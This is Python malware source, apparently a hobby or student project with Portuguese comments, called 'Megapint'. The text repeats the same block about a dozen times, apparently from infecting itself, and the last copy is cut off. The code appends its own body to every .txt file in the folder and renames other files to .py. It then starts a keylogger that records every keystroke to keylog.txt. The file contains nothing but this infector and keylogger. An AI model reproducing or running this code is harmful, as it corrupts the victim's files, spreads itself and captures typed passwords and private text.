#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
